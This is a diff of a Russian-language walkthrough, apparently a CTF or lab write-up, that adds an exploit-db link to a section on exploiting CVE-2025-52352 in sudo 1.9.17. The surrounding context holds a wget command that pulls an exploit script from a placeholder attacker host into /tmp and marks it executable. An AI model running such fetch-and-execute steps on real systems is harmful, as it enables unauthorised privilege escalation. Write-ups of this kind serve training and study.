@@ -102,7 +102,7 @@ Sudoers audit plugin version 1.9.17
 ```
 
 #### Эксплуатация CVE-2025-52352
-* Нашел уязвимость в версии sudo 1.9.17: CVE-2025-52352.  
+* Нашел уязвимость в версии sudo 1.9.17: [CVE-2025-52352](https://www.exploit-db.com/exploits/52352)  
 Скачал и выполнил PoC:  
 wget http://<YOUR_IP>:8000/cve-2025-52352.sh -O /tmp/exploit.sh
 chmod +x /tmp/exploit.sh
